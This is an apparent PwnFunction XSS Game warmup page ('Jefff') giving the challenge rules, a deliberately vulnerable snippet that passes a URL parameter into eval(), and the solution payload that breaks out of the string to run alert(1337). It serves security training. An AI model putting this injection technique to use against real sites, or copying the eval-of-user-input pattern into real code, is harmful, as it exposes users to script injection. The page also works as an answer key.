---
title: "XSS Game - Jefff | PwnFunction"
header: "Jefff"
challengeUrl: "https://sandbox.pwnfunction.com/warmups/jefff.html"
date: 2020-01-19T18:08:44+05:30
draft: false
type: warmup
difficulty: Easy
---

{{< rules >}}
<li>Difficulty is <b>Easy</b>.</li>
<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
<li>No user interaction.</li>
<li>Cannot use <code>https://sandbox.pwnfunction.com/?html=&js=&css=</code>.</li>
<li>Tested on <b>Chrome</b>.</li>
{{</ rules >}}

{{< code >}}<code class="language-markup">&#x3C;!-- Challenge --&#x3E;
&#x3C;h2 id=&#x22;maname&#x22;&#x3E;&#x3C;/h2&#x3E;
&#x3C;script&#x3E;
    let jeff = (new URL(location).searchParams.get(&#x27;jeff&#x27;) || &#x22;JEFFF&#x22;)
    let ma = &#x22;&#x22;
    eval(&#x60;ma = &#x22;Ma name ${jeff}&#x22;&#x60;)
    setTimeout(_ =&#x3E; {
        maname.innerText = ma
    }, 1000)
&#x3C;/script&#x3E;</code>{{< /code >}}

{{< solution >}}
<p>The GET parameter <code>jeff</code> lands inside eval
    <code>eval(`ma = "Ma name ${jeff}"`)</code>, hence we can break out of the string with double
    quotes and execute our own code.
</p>

<pre class="solution-code-block"><code class="language-js">"-alert(1337)-"</code></pre>
{{< /solution >}}